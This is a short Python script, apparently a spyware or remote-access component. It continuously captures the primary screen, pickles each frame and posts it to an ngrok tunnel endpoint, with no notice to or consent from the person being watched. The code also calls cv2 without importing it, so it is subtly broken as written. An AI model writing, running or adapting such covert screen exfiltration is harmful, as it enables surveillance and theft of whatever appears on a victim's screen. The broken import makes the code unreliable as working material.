import socket
import mss
import numpy as np
import pickle
import requests
import time

# Function to capture the screen
def capture_screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Capture the primary monitor
        while True:
            img = sct.grab(monitor)
            img_np = np.array(img)
            img_np = cv2.cvtColor(img_np, cv2.COLOR_BGRA2BGR)
            yield img_np

def send_screen_to_listener():
    server_url = 'https://1fa6-79-134-141-41.ngrok-free.app/screen'  # Your Ngrok URL
    screen_gen = capture_screen()

    for screen in screen_gen:
        data = pickle.dumps(screen)
        try:
            requests.post(server_url, data=data)
            time.sleep(0.1)  # Adjust delay as needed for performance
        except Exception as e:
            print(f"Error sending screen: {e}")

if __name__ == "__main__":
    send_screen_to_listener()
